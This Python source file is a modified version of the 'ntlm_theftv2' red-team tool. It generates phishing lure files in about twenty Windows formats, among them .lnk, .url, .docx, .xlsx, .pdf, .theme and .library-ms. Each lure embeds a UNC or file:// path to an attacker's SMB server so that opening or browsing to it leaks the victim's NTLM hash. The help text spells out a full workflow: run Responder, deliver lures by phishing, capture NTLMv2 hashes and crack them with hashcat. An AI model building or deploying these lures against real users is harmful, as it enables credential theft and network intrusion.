#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# References:
# https://ired.team/offensive-security/initial-access/t1187-forced-authentication
# https://www.securify.nl/blog/SFY20180501/living-off-the-land_-stealing-netntlm-hashes.html
# https://ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros
# https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/
# https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py
# https://github.com/rocketscientist911/excel-ntlmv2
# https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/
# https://www.youtube.com/watch?v=PDpBEY1roRc
# https://web.archive.org/web/20190106181024/https://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-.LIBRARY-MS-FILETYPE-INFORMATION-DISCLOSURE.txt

import argparse
import shutil
import sys
import tempfile
from pathlib import Path

import xlsxwriter

SCRIPT_DIR = Path(__file__).parent

# NOT WORKING ON LATEST WINDOWS: .scf, autorun.inf, desktop.ini
# Browse to folder: .url, .lnk, .scf, autorun.inf, desktop.ini, .library-ms
# Open file: .xml, .rtf, .jnlp, .xml (includePicture), .asx, .docx (x3), .xlsx, .htm, .wax, .theme
# Open and allow: .pdf
# Browser download and open: .application
# Partial open: .m3u (works in Windows Media Player; Win10 auto-opens with Groove Music)


def create_scf(generate, server, filename):
    if generate == "modern":
        print("Skipping SCF as it does not work on modern Windows")
        return
    Path(filename).write_text(
        f'[Shell]\nCommand=2\nIconFile=\\\\{server}\\tools\\nc.ico\n[Taskbar]\nCommand=ToggleDesktop',
        encoding='utf-8',
    )
    print(f"Created: {filename} (BROWSE TO FOLDER)")


def create_url_url(generate, server, filename):
    Path(filename).write_text(
        f'[InternetShortcut]\nURL=file://{server}/leak/leak.html',
        encoding='utf-8',
    )
    print(f"Created: {filename} (BROWSE TO FOLDER)")


def create_url_icon(generate, server, filename):
    Path(filename).write_text(
        f'[InternetShortcut]\nURL=whatever\nWorkingDirectory=whatever\n'
        f'IconFile=\\\\{server}\\%USERNAME%.icon\nIconIndex=1',
        encoding='utf-8',
    )
    print(f"Created: {filename} (BROWSE TO FOLDER)")


def create_rtf(generate, server, filename):
    # Raw string avoids double-escaping the RTF control words
    Path(filename).write_text(
        r'{\rtf1{\field{\*\fldinst {INCLUDEPICTURE "file://' + server + r'/test.jpg" \\* MERGEFORMAT\\d}}{\fldrslt}}}',
        encoding='utf-8',
    )
    print(f"Created: {filename} (OPEN)")


def create_xml(generate, server, filename):
    Path(filename).write_text(
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<?mso-application progid="Word.Document"?>\n'
        f'<?xml-stylesheet type="text/xsl" href="\\\\{server}\\bad.xsl" ?>',
        encoding='utf-8',
    )
    print(f"Created: {filename} (OPEN)")


def create_xml_includepicture(generate, server, filename):
    template = SCRIPT_DIR / "templates" / "includepicture-template.xml"
    content = template.read_text(encoding='utf-8').replace('127.0.0.1', server)
    Path(filename).write_text(content, encoding='utf-8')
    print(f"Created: {filename} (OPEN)")


def create_htm(generate, server, filename):
    Path(filename).write_text(
        f'<!DOCTYPE html>\n<html>\n   <img src="file://{server}/leak/leak.png"/>\n</html>',
        encoding='utf-8',
    )
    print(f"Created: {filename} (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)")


def create_htm_handler(generate, server, filename):
    Path(filename).write_text(
        '<!DOCTYPE html>\n<html>\n\t<script>\n\t\tlocation.href = '
        f"'ms-word:ofe|u|\\\\{server}\\leak\\leak.docx';\n\t</script>\n</html>",
        encoding='utf-8',
    )
    print(f"Created: {filename} (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)")


def _pack_docx_template(template_name, rel_rels_path, server, filename):
    src = SCRIPT_DIR / "templates" / template_name
    with tempfile.TemporaryDirectory() as tmpdir:
        dest = Path(tmpdir) / template_name
        shutil.copytree(src, dest)
        target = dest / rel_rels_path
        content = target.read_text(encoding='utf-8').replace('127.0.0.1', server)
        target.write_text(content, encoding='utf-8')
        archive_base = str(Path(tmpdir) / "archive")
        shutil.make_archive(archive_base, 'zip', str(dest))
        shutil.move(archive_base + ".zip", filename)


def create_docx_includepicture(generate, server, filename):
    _pack_docx_template(
        "docx-includepicture-template",
        Path("word") / "_rels" / "document.xml.rels",
        server, filename,
    )
    print(f"Created: {filename} (OPEN)")


def create_docx_remote_template(generate, server, filename):
    _pack_docx_template(
        "docx-remotetemplate-template",
        Path("word") / "_rels" / "settings.xml.rels",
        server, filename,
    )
    print(f"Created: {filename} (OPEN)")


def create_docx_frameset(generate, server, filename):
    _pack_docx_template(
        "docx-frameset-template",
        Path("word") / "_rels" / "webSettings.xml.rels",
        server, filename,
    )
    print(f"Created: {filename} (OPEN)")


def create_xlsx_externalcell(generate, server, filename):
    workbook = xlsxwriter.Workbook(filename)
    worksheet = workbook.add_worksheet()
    worksheet.write_url('AZ1', f"external://{server}\\share\\[Workbookname.xlsx]SheetName'!$B$2:$C$62,2,FALSE)")
    workbook.close()
    print(f"Created: {filename} (OPEN)")


def create_wax(generate, server, filename):
    Path(filename).write_text(
        f'https://{server}/test\nfile://\\\\{server}/steal/file',
        encoding='utf-8',
    )
    print(f"Created: {filename} (OPEN)")


def create_m3u(generate, server, filename):
    Path(filename).write_text(
        f'#EXTM3U\n#EXTINF:1337, Leak\n\\\\{server}\\leak.mp3',
        encoding='utf-8',
    )
    print(f"Created: {filename} (OPEN IN WINDOWS MEDIA PLAYER ONLY)")


def create_asx(generate, server, filename):
    Path(filename).write_text(
        f'<asx version="3.0">\n   <title>Leak</title>\n   <entry>\n'
        f'      <title></title>\n      <ref href="file://{server}/leak/leak.wma"/>\n'
        '   </entry>\n</asx>',
        encoding='utf-8',
    )
    print(f"Created: {filename} (OPEN)")


def create_jnlp(generate, server, filename):
    Path(filename).write_text(
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<jnlp spec="1.0+" codebase="" href="">\n   <resources>\n'
        f'      <jar href="file://{server}/leak/leak.jar"/>\n'
        '   </resources>\n   <application-desc/>\n</jnlp>',
        encoding='utf-8',
    )
    print(f"Created: {filename} (OPEN)")


def create_application(generate, server, filename):
    Path(filename).write_text(
        '<?xml version="1.0" encoding="utf-8"?>\n'
        '<asmv1:assembly xsi:schemaLocation="urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd"'
        ' manifestVersion="1.0" xmlns:dsig="http://www.w3.org/2000/09/xmldsig#"'
        ' xmlns="urn:schemas-microsoft-com:asm.v2" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1"'
        ' xmlns:asmv2="urn:schemas-microsoft-com:asm.v2" xmlns:xrml="urn:mpeg:mpeg21:2003:01-REL-R-NS"'
        ' xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">\n'
        '   <assemblyIdentity name="Leak.app" version="1.0.0.0" publicKeyToken="0000000000000000"'
        ' language="neutral" processorArchitecture="x86" xmlns="urn:schemas-microsoft-com:asm.v1" />\n'
        '   <description asmv2:publisher="Leak" asmv2:product="Leak" asmv2:supportUrl=""'
        ' xmlns="urn:schemas-microsoft-com:asm.v1" />\n'
        '   <deployment install="false" mapFileExtensions="true" trustURLParameters="true" />\n'
        '   <dependency>\n'
        f'      <dependentAssembly dependencyType="install" codebase="file://{server}/leak/Leak.exe.manifest" size="32909">\n'
        '         <assemblyIdentity name="Leak.exe" version="1.0.0.0" publicKeyToken="0000000000000000"'
        ' language="neutral" processorArchitecture="x86" type="win32" />\n'
        '         <hash>\n'
        '            <dsig:Transforms>\n'
        '               <dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" />\n'
        '            </dsig:Transforms>\n'
        '            <dsig:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1" />\n'
        '            <dsig:DigestValue>ESZ11736AFIJnp6lKpFYCgjw4dU=</dsig:DigestValue>\n'
        '         </hash>\n'
        '      </dependentAssembly>\n'
        '   </dependency>\n'
        '</asmv1:assembly>',
        encoding='utf-8',
    )
    print(f"Created: {filename} (DOWNLOAD AND OPEN)")


def create_pdf(generate, server, filename):
    # PDF string syntax: (\\\\server\\test) encodes UNC path \\server\test
    # Each \\ pair in PDF = one literal backslash, so 4 Python backslashes → 2 PDF backslashes
    Path(filename).write_text(
        '%PDF-1.7\n'
        '1 0 obj\n'
        '<</Type/Catalog/Pages 2 0 R>>\n'
        'endobj\n'
        '2 0 obj\n'
        '<</Type/Pages/Kids[3 0 R]/Count 1>>\n'
        'endobj\n'
        '3 0 obj\n'
        '<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>\n'
        'endobj\n'
        'xref\n'
        '0 4\n'
        '0000000000 65535 f\n'
        '0000000015 00000 n\n'
        '0000000060 00000 n\n'
        '0000000111 00000 n\n'
        'trailer\n'
        '<</Size 4/Root 1 0 R>>\n'
        'startxref\n'
        '190\n'
        '3 0 obj\n'
        '<< /Type /Page\n'
        '   /Contents 4 0 R\n'
        '   /AA <<\n'
        '\t   /O <<\n'
        '\t      /F (\\\\\\\\' + server + '\\\\test)\n'
        '\t\t  /D [ 0 /Fit]\n'
        '\t\t  /S /GoToE\n'
        '\t\t  >>\n'
        '\t   >>\n'
        '\t   /Parent 2 0 R\n'
        '\t   /Resources <<\n'
        '\t\t\t/Font <<\n'
        '\t\t\t\t/F1 <<\n'
        '\t\t\t\t\t/Type /Font\n'
        '\t\t\t\t\t/Subtype /Type1\n'
        '\t\t\t\t\t/BaseFont /Helvetica\n'
        '\t\t\t\t\t>>\n'
        '\t\t\t\t  >>\n'
        '\t\t\t\t>>\n'
        '>>\n'
        'endobj\n'
        '4 0 obj<< /Length 100>>\n'
        'stream\n'
        'BT\n'
        '/TI_0 1 Tf\n'
        '14 0 0 14 10.000 753.976 Tm\n'
        '0.0 0.0 0.0 rg\n'
        '(PDF Document) Tj\n'
        'ET\n'
        'endstream\n'
        'endobj\n'
        'trailer\n'
        '<<\n'
        '\t/Root 1 0 R\n'
        '>>\n'
        '%%EOF',
        encoding='utf-8',
    )
    print(f"Created: {filename} (OPEN AND ALLOW)")


def create_zoom(generate, server, filename):
    if generate == "modern":
        print("Skipping zoom as it does not work on the latest versions")
        return
    Path(filename).write_text(
        'To attack zoom, just put the following link along with your phishing message in the chat window:\n\n'
        f'\\\\{server}\\xyz\n',
        encoding='utf-8',
    )
    print(f"Created: {filename} (PASTE TO CHAT)")


def create_theme(generate, server, filename):
    # GUIDs in registry-style section headers contain literal braces;
    # string concatenation avoids the need to escape them for f-strings
    content = (
        '[Theme]\n'
        '; Windows - IDS_THEME_DISPLAYNAME_AERO_LIGHT\n'
        'DisplayName=\\' + server + ' Theme\n'
        'SetLogonBackground=0\n'
        '; Computer - SHIDI_SERVER\n'
        '[CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\DefaultIcon]\n'
        'DefaultValue=\\\\' + server + '\\setup.exe,-109\n'
        '\n'
        '; UsersFiles - SHIDI_USERFILES\n'
        '[CLSID\\{59031A47-3F72-44A7-89C5-5595FE6B30EE}\\DefaultIcon]\n'
        'DefaultValue=\\\\' + server + '\\setup.exe,-123\n'
        '\n'
        '; Network - SHIDI_MYNETWORK\n'
        '[CLSID\\{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}\\DefaultIcon]\n'
        'DefaultValue=\\\\' + server + '\\setup.exe,-25\n'
        '\n'
        '; Recycle Bin - SHIDI_RECYCLERFULL SHIDI_RECYCLER\n'
        '[CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\DefaultIcon]\n'
        'Full=\\\\' + server + '\\setup.exe,-54\n'
        'Empty=\\\\' + server + '\\setup.exe,-55\n'
        '\n'
        '[Control Panel\\Cursors]\n'
        'AppStarting=\\\\' + server + '\\setup.exe\n'
        'Arrow=\\\\' + server + '\\aero_arrow.cur\n'
        'Crosshair=\n'
        'Hand=\\\\' + server + '\\aero_link.cur\n'
        'Help=\\\\' + server + '\\aero_helpsel.cur\n'
        'IBeam=\n'
        'No=\\\\' + server + '\\aero_unavail.cur\n'
        'NWPen=\\\\' + server + '\\aero_pen.cur\n'
        'SizeAll=\\\\' + server + '\\aero_move.cur\n'
        'SizeNESW=\\\\' + server + '\\aero_nesw.cur\n'
        'SizeNS=\\\\' + server + '\\aero_ns.cur\n'
        'SizeNWSE=\\\\' + server + '\\aero_nwse.cur\n'
        'SizeWE=\\\\' + server + '\\aero_ew.cur\n'
        'UpArrow=\\\\' + server + '\\aero_up.cur\n'
        'Wait=\\\\' + server + '\\aero_busy.ani\n'
        'DefaultValue=Windows Default\n'
        'DefaultValue.MUI=@main.cpl,-1020\n'
        '\n'
        '[Control Panel\\Desktop]\n'
        'Wallpaper=\\\\' + server + '\\setup.exe\n'
        'TileWallpaper=0\n'
        'WallpaperStyle=10\n'
        'Pattern=\n'
        'MultimonBackgrounds=0\n'
        '\n'
        '[VisualStyles]\n'
        'Path=\\\\' + server + '\\Themes\\Aero\\Aero.msstyles\n'
        'ColorStyle=NormalColor\n'
        'Size=NormalSize\n'
        'AutoColorization=0\n'
        'ColorizationColor=0XC40078D4\n'
        'SystemMode=Light\n'
        'AppMode=Light\n'
        '\n'
        '[boot]\n'
        'SCRNSAVE.EXE=\n'
        '\n'
        '[MasterThemeSelector]\n'
        'MTSM=RJSPBS\n'
        '\n'
        '[Sounds]\n'
        '; IDS_SCHEME_DEFAULT\n'
        'SchemeName=@\\\\' + server + '\\setup.dll,-800\n'
    )
    Path(filename).write_text(content, encoding='utf-8')
    print(f"Created: {filename} (THEME TO INSTALL)")


def create_autoruninf(generate, server, filename):
    if generate == "modern":
        print("Skipping Autorun.inf as it does not work on modern Windows")
        return
    Path(filename).write_text(
        f'[autorun]\nopen=\\\\{server}\\setup.exe\nicon=something.ico\naction=open Setup.exe',
        encoding='utf-8',
    )
    print(f"Created: {filename} (BROWSE TO FOLDER)")


def create_desktopini(generate, server, filename):
    if generate == "modern":
        print("Skipping desktop.ini as it does not work on modern Windows")
        return
    Path(filename).write_text(
        f'[.ShellClassInfo]\nIconResource=\\\\{server}\\aa',
        encoding='utf-8',
    )
    print(f"Created: {filename} (BROWSE TO FOLDER)")


def create_libraryms(generate, server, filename):
    Path(filename).write_text(
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">\n'
        '<name>@shell32.dll,-34575</name>\n'
        '<ownerSID>S-1-5-21-372074477-2495183225-776587326-1000</ownerSID>\n'
        '<version>1</version>\n'
        '<isLibraryPinned>true</isLibraryPinned>\n'
        f'<iconReference>\\\\{server}\\aa</iconReference>\n'
        '<templateInfo>\n'
        '<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>\n'
        '</templateInfo>\n'
        '<searchConnectorDescriptionList>\n'
        '<searchConnectorDescription publisher="Microsoft" product="Windows">\n'
        '<description>@shell32.dll,-34577</description>\n'
        '<isDefaultSaveLocation>true</isDefaultSaveLocation>\n'
        '<simpleLocation>\n'
        '<url>knownfolder:{FDD39AD0-238F-46AF-ADB4-6C85480369C7}</url>\n'
        '<serialized>MBAAAEAFCAAA...MFNVAAAAAA</serialized>\n'
        '</simpleLocation>\n'
        '</searchConnectorDescription>\n'
        '<searchConnectorDescription publisher="Microsoft" product="Windows">\n'
        '<description>@shell32.dll,-34579</description>\n'
        '<isDefaultNonOwnerSaveLocation>true</isDefaultNonOwnerSaveLocation>\n'
        '<simpleLocation>\n'
        '<url>knownfolder:{ED4824AF-DCE4-45A8-81E2-FC7965083634}</url>\n'
        '<serialized>MBAAAEAFCAAA...HJIfK9AAAAAA</serialized>\n'
        '</simpleLocation>\n'
        '</searchConnectorDescription>\n'
        '</searchConnectorDescriptionList>\n'
        '</libraryDescription>',
        encoding='utf-8',
    )
    print(f"Created: {filename} (BROWSE TO FOLDER)")


def create_lnk(generate, server, filename):
    # Offset and max_path are fixed by the binary shortcut template structure
    offset = 0x136
    max_path = 0xDF
    unc_path = f'\\\\{server}\\tools\\nc.ico'
    if len(unc_path) >= max_path:
        print("Server name too long for lnk template, skipping.")
        return
    unc_path_bytes = unc_path.encode('utf-16le')
    template = SCRIPT_DIR / "templates" / "shortcut-template.lnk"
    shortcut = bytearray(template.read_bytes())
    shortcut[offset: offset + len(unc_path_bytes)] = unc_path_bytes
    Path(filename).write_bytes(bytes(shortcut))
    print(f"Created: {filename} (BROWSE TO FOLDER)")


def main():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description='ntlm_theftv2 by Jacob Wilkin (Greenwolf)\nModified by nithin0x',
        usage='%(prog)s --generate all --server <ip_of_smb_catcher_server> --filename <base_file_name>',
        epilog='''\
Examples:
  Generate all theft files targeting a Responder listener:
    %(prog)s -g all -s 192.168.1.10 -f invoice

  Generate only modern-Windows-compatible files:
    %(prog)s -g modern -s 192.168.1.10 -f board-meeting

  Generate a single PDF lure:
    %(prog)s -g pdf -s 192.168.1.10 -f Q4-report

  Generate a malicious XLSX for finance phishing:
    %(prog)s -g xlsx -s 192.168.1.10 -f Bonus_Payment_Q4

  Generate .docx variants (includepicture, remotetemplate, frameset):
    %(prog)s -g docx -s 10.10.10.5 -f contract

  Generate URL shortcut files for shared folder drops:
    %(prog)s -g url -s 10.10.10.5 -f important

  Generate a .lnk shortcut for folder-browse triggers:
    %(prog)s -g lnk -s 10.10.10.5 -f setup

  Generate an RTF document lure:
    %(prog)s -g rtf -s 10.10.10.5 -f memo

Typical workflow:
  1. Start Responder: sudo responder -I eth0 -wrf
  2. Generate files: %(prog)s -g all -s <responder-ip> -f lure
  3. Deliver lure files via phishing or shared folder
  4. Capture NTLMv2 hashes in Responder output
  5. Crack offline: hashcat -m 5600 hashes.txt wordlist.txt
''',
    )
    parser.add_argument('-v', '--version', action='version',
                        version='%(prog)s 0.2.2 : ntlm_theftv2 by Jacob Wilkin (Greenwolf) | Modified by nithin0x')
    parser.add_argument('-g', '--generate', action='store', dest='generate', required=True,
                        choices={
                            "modern", "all", "scf", "url", "lnk", "rtf", "xml", "htm",
                            "docx", "xlsx", "wax", "m3u", "asx", "jnlp", "application",
                            "pdf", "zoom", "libraryms", "autoruninf", "desktopini", "theme",
                        },
                        help='Choose to generate all files or a specific filetype')
    parser.add_argument('-s', '--server', action='store', dest='server', required=True,
                        help='IP/hostname of your SMB hash capture server (Responder, ntlmrelayx, etc.)')
    parser.add_argument('-f', '--filename', action='store', dest='filename', required=True,
                        help='Base filename without extension (e.g. test, Board-Meeting2020)')
    args = parser.parse_args()

    out_dir = Path(args.filename)
    if out_dir.exists():
        answer = input(f"'{args.filename}' already exists. Delete and recreate? [y/N] ").strip().lower()
        if answer not in ("y", "yes"):
            sys.exit(0)
        shutil.rmtree(out_dir)
    out_dir.mkdir(parents=True)

    g = args.generate
    s = args.server
    base = str(out_dir / args.filename)
    fixed = str(out_dir)  # directory for files with fixed names

    if g in ("all", "modern"):
        create_scf(g, s, base + ".scf")
        create_url_url(g, s, base + "-(url).url")
        create_url_icon(g, s, base + "-(icon).url")
        create_lnk(g, s, base + ".lnk")
        create_rtf(g, s, base + ".rtf")
        create_xml(g, s, base + "-(stylesheet).xml")
        create_xml_includepicture(g, s, base + "-(fulldocx).xml")
        create_htm(g, s, base + ".htm")
        create_htm_handler(g, s, base + "-(handler).htm")
        create_docx_includepicture(g, s, base + "-(includepicture).docx")
        create_docx_remote_template(g, s, base + "-(remotetemplate).docx")
        create_docx_frameset(g, s, base + "-(frameset).docx")
        create_xlsx_externalcell(g, s, base + "-(externalcell).xlsx")
        create_wax(g, s, base + ".wax")
        create_m3u(g, s, base + ".m3u")
        create_asx(g, s, base + ".asx")
        create_jnlp(g, s, base + ".jnlp")
        create_application(g, s, base + ".application")
        create_pdf(g, s, base + ".pdf")
        create_zoom(g, s, fixed + "/zoom-attack-instructions.txt")
        create_libraryms(g, s, base + ".library-ms")
        create_autoruninf(g, s, fixed + "/Autorun.inf")
        create_desktopini(g, s, fixed + "/desktop.ini")
        create_theme(g, s, base + ".theme")
    elif g == "scf":
        create_scf(g, s, base + ".scf")
    elif g == "url":
        create_url_url(g, s, base + "-(url).url")
        create_url_icon(g, s, base + "-(icon).url")
    elif g == "lnk":
        create_lnk(g, s, base + ".lnk")
    elif g == "rtf":
        create_rtf(g, s, base + ".rtf")
    elif g == "xml":
        create_xml(g, s, base + "-(stylesheet).xml")
        create_xml_includepicture(g, s, base + "-(fulldocx).xml")
    elif g == "htm":
        create_htm(g, s, base + ".htm")
        create_htm_handler(g, s, base + "-(handler).htm")
    elif g == "docx":
        create_docx_includepicture(g, s, base + "-(includepicture).docx")
        create_docx_remote_template(g, s, base + "-(remotetemplate).docx")
        create_docx_frameset(g, s, base + "-(frameset).docx")
    elif g == "xlsx":
        create_xlsx_externalcell(g, s, base + "-(externalcell).xlsx")
    elif g == "wax":
        create_wax(g, s, base + ".wax")
    elif g == "m3u":
        create_m3u(g, s, base + ".m3u")
    elif g == "asx":
        create_asx(g, s, base + ".asx")
    elif g == "jnlp":
        create_jnlp(g, s, base + ".jnlp")
    elif g == "application":
        create_application(g, s, base + ".application")
    elif g == "pdf":
        create_pdf(g, s, base + ".pdf")
    elif g == "zoom":
        create_zoom(g, s, fixed + "/zoom-attack-instructions.txt")
    elif g == "libraryms":
        create_libraryms(g, s, base + ".library-ms")
    elif g == "autoruninf":
        create_autoruninf(g, s, fixed + "/Autorun.inf")
    elif g == "desktopini":
        create_desktopini(g, s, fixed + "/desktop.ini")
    elif g == "theme":
        create_theme(g, s, base + ".theme")

    print("Generation Complete.")


if __name__ == "__main__":
    main()
